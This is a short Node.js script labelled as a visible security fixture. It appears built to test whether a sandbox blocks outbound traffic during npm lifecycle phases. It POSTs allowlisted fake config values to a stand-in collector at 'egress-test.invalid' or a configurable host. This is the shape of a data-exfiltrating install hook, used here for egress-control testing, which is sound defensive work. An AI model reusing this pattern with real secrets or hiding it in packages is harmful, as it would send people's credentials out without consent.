'use strict';

// Deliberately visible security fixture. Reads only allowlisted fake file settings.
const http = require('node:http');
const https = require('node:https');
const phase = process.argv[2] || 'run';
const payload = {
  simulation: true,
  fixture: 'secure-box-npm-fixture',
  phase,
  env: require('./config.cjs'),
  source: '.env.simulation'
};

if (phase === 'preview') {
  console.log(JSON.stringify(payload, null, 2));
  process.exit(0);
}

let target;
try {
  target = new URL(process.env.SIMULATION_TARGET || 'https://egress-test.invalid/collect');
  if (!['http:', 'https:'].includes(target.protocol) || target.username || target.password) {
    throw new Error('Use an HTTP(S) URL without embedded credentials');
  }
} catch (error) {
  console.error('[SIMULATION] Invalid endpoint:', error.message);
  process.exit(1);
}

console.log(`[SIMULATION] ${phase}: attempting one POST to ${target.origin}${target.pathname}`);
console.log('[SIMULATION] Only allowlisted .env.simulation values are sent. Timeout: 5 seconds. No retries or redirects.');
const body = JSON.stringify(payload);
const transport = target.protocol === 'https:' ? https : http;
const request = transport.request(target, {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': Buffer.byteLength(body),
    'X-Security-Simulation': 'synthetic-canary-only'
  }
}, response => {
  console.log(`[SIMULATION] HTTP ${response.statusCode} received: a server was reachable. Check collector and secure-box logs for delivery.`);
  response.resume();
  response.on('error', error => {
    console.error('[SIMULATION] Response error:', error.message);
    process.exitCode = 2;
  });
  response.on('end', () => clearTimeout(deadline));
});
const deadline = setTimeout(() => request.destroy(new Error('5-second deadline exceeded')), 5000);
request.on('error', error => {
  clearTimeout(deadline);
  console.error(`[SIMULATION] Request failed (${error.code || 'ERROR'}): ${error.message}`);
  console.error('[SIMULATION] Failure alone does not prove blocking; inspect secure-box logs.');
  process.exitCode = 2;
});
request.end(body);
